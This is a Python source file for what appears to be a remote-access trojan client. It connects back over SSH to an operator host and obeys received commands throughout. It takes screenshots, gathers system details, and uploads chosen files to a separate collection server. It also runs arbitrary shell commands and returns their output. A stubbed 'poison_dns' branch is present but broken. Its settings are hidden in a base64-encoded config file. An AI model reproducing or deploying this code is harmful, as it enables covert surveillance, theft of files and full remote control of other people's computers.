#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko
import sys
import subprocess
import base64
import hashlib
import gtk.gdk
import platform
import random
import requests
import os

USERNAME = ""
PASSWORD = ""
PORT = ""
KEY = ""
ADDRESSH = ""
ADDRESSRV = ""

def ssh_client(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print ssh_session.recv(1024)
        while True:
			command = ssh_session.recv(1024)
			print "Got Command:%s" % command
			if command == 'grab_screen':
				if grab_screen():
					ssh_session.send("[+] Client Say: screen captured and sent...")
				else:
					ssh_session.send("[-] Client Say: operation failed")
			elif command == 'get_sys_info':
				data = ""
				for n in platform.uname():
					data += n + " || "
				requests.post(ADDRESSRV, data = {'key':KEY,'operation':'sys_info','sys':data})
				ssh_session.send("[+] Client Say: sys data sent to server")
			elif command[:8] == "get_file":
				file_pathname = command[9:]
				print "[+] File pathname: " + file_pathname
				files = {'file':open(file_pathname,'rb')}
				requests.post(ADDRESSRV, data={'key':KEY,'operation':'file'}, files=files)
				ssh_session.send("[+] Client Say: file sent to server")
			elif command == "poison_dns":
				cmd_value = ""
				while "#eNd#" not in cmd_value:
					cmd_value = ssh_session.recv(1024)
					cmd_output = subprocess.check_output(command, shell=True)
					ssh_session.send(cmd_output)
			else:
				try:
					cmd_output = subprocess.check_output(command, shell=True)
					ssh_session.send(cmd_output)
				except Exception as ex:
					ssh_session.send(str(ex))
					#client.close()
	
	
def read_config():
	global PORT,USERNAME,PASSWORD,KEY,ADDRESSH, ADDRESSRV
	konfig = open("Konfig.conf","r")
	konfig_strings =  base64.b64decode(konfig.read()).split("[!]")
	for n in konfig_strings:
		if n[0] == "#":
			pass
		elif "address_srv" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			ADDRESSRV = n[start_index:end_index]
		elif "address_ssh" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			ADDRESSH = n[start_index:end_index]
		elif "port" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			PORT = int(n[start_index:end_index])
		elif "username" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			USERNAME = n[start_index:end_index]
		elif "password" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			PASSWORD = n[start_index:end_index]
		elif "key" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			KEY = n[start_index:end_index]
	

def grab_screen():
	window = gtk.gdk.get_default_root_window()
	size = window.get_size()
	print "[+] Window Size: %d x %d " % size
	pixel_buffer = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,size[0],size[1])
	pixel_buffer = pixel_buffer.get_from_drawable(window,window.get_colormap(),0,0,0,0,size[0],size[1])
	if pixel_buffer:
		screen_name = "screen" + str(random.randint(1111,99999)) + ".png"
		pixel_buffer.save(screen_name,"png")
		print "[+] Screenshot saved"
		files = {'screen':open(screen_name,'rb')}
		requests.post(ADDRESSRV, data={'key':KEY,'operation':'screen'}, files=files)
		os.remove(screen_name)
		return True
	else:
		return False
		return False 
	
def main(args):
    return 0

if __name__ == '__main__':
	read_config()
	ssh_client(ADDRESSH, PORT, USERNAME, PASSWORD)
	
	
	
'''

Konfig.conf file example:

port:xxx#
username:xxx#
password:xxx#
key:xxx#

'''
